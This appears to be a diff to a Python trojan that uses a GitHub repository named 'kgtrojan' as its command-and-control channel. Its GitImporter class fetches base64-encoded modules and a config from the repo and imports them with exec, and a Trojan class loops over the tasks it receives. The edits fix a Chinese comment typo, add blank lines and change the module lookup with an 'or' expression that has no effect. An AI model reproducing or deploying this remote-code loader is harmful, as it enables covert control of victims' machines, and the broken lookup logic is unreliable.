@@ -16,11 +16,11 @@ class GitImporter(object):
     def __init__(self):
         self.current_module_code = ""
 
-    #找到moudule并读取其中代码,将代码饭胡在self.current_module_code中
+    #找到moudule并读取其中代码,将代码放在self.current_module_code中
     def find_module(self, name, path=None):
         print("[*] Attempting to retrieve %s" % name)
         self.connection = github_connect()
-        new_library = get_file_contents("modules", f"{name}.py", self.connection)
+        new_library = get_file_contents("modules", f"{name}.py" or f"{name}/__init__.py", self.connection)
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
             return self
@@ -43,6 +43,7 @@ def github_connect():
     session = github3.login(token=token)
     return session.repository(user, "kgtrojan")
 
+
 def get_file_contents(dirname, filename, repo):
     return repo.file_contents(f'{dirname}/{filename}').content
 
@@ -54,6 +55,7 @@ class Trojan:
         self.data_dir = f"data/{id}/"
         self.repo = github_connect()
 
+
     def get_trojan_config(self):
         config_json = get_file_contents("config", self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
@@ -61,6 +63,7 @@ class Trojan:
             if tasks['module'] not in sys.modules:
                 exec("import %s" % tasks['module'])
         return config
+
 
     def run(self):
         while True:
